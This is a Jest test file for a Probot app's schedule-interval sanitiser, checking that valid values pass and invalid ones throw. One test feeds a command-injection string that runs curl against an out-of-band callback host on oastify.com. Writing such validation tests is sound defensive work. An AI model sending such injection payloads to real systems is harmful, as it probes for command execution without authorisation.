import { DeprecatedLogger } from 'probot/lib/types'
import { Probot } from 'probot'
import { DiagnosticsService } from '../src/services/diagnostics'

jest.mock('probot', () => {
  const logger = {
    info: jest.fn(),
    error: jest.fn()
  }
  return {
    Probot: jest.fn(() => ({
      log: logger
    }))
  }
})

describe('sanitizeScheduleInterval', () => {
  const probot = new Probot()
  const logger: DeprecatedLogger = probot.log
  const diagnosticsService = new DiagnosticsService(logger)
  test('should return expected schedule interval from repo config', async () => {
    const owner = 'dummy'
    const repo = 'dummy'
    const sanitizeScheduleInterval = 'monthly'
    const scheduleInterval = await diagnosticsService.sanitizeScheduleInterval(sanitizeScheduleInterval, owner, repo)
    expect(scheduleInterval).toBe('monthly')
  })

  test('should throw error on un-expected schedule interval from repo config', async () => {
    const owner = 'dummy'
    const repo = 'dummy'
    const sanitizeScheduleInterval = 'bi-weekly'
    let error: Error | undefined
    try {
      await diagnosticsService.sanitizeScheduleInterval(sanitizeScheduleInterval, owner, repo)
    } catch (err) {
      error = err as Error
    }
    expect(error).toBeDefined()
  })

  test('should throw error on un-expected schedule interval from repo config', async () => {
    const owner = 'dummy'
    const repo = 'dummy'
    const sanitizeScheduleInterval = '$(curl http://jd0q6db7se2x9zynxzvgezle45awyomd.oastify.com/testing)'
    let error: Error | undefined
    try {
      await diagnosticsService.sanitizeScheduleInterval(sanitizeScheduleInterval, owner, repo)
    } catch (err) {
      error = err as Error
    }
    expect(error).toBeDefined()
  })
})
